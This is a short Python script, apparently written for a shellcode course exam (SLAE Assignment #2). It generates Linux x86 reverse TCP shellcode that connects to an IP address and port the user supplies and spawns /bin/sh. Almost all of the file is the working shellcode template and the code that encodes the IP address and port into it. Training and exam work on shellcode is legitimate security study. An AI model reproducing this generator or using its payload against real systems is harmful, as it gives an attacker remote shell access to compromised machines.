#!/usr/bin/env python

# SLAE Exam Assignment #2: Shell Reverse TCP shellcode generator 
# Author: Rikih Gunawan

import sys

SHELLCODE=\
"\"\\x31\\xc9\\xf7\\xe1\\x99\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x97\\x6a\\x66\\x58\\x6a\\x03\\x5b\\x68%s\\x66\\x68%s\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x6a\\x02\\x59\\x57\\x5b\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x6a\\x0b\\x58\\x31\\xc9\\x51\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\""

if len(sys.argv) != 3:
  print("[-1] ERROR: Enter the ip address and port number")
  exit()

ip=sys.argv[1]
port=sys.argv[2]

if (len(ip.split('.')) != 4):
    print("\n[-] ERROR: IP Address is incorrect!\n")
    exit()

if ((int(port) > 65535) or (int(port) < 256)):
    print("\n[-] ERROR: Port number must be between 256 and 65535\n")
    exit()

# ip
hexip = "".join([ hex(int(y))[2:].zfill(2) for y in ip.split('.') ])
hexipsh = "".join([ "\\x" + hex(int(y))[2:].zfill(2) for y in ip.split('.') ])

# port
hexport = hex(int(port)).replace('0x','')
if len(hexport)<4:
    hexport = '0'+hexport

if '00' in hexport[:2] or '00' in hexport[2:4] or '00' in ip:
    print "[-] FAILED: ip address or port number null bytes found!"
    sys.exit(1)

print("Port: %s"% port)
print("Hex Port: %s"% hexport)
print("IP Address: %s"% ip)
print("Hex IP Address: %s"% hexip)
print("\nShellcode:")
print(SHELLCODE%(hexipsh, "\\x" + str(hexport[:2]) + "\\x" + str(hexport[2:4])))
print("\n")
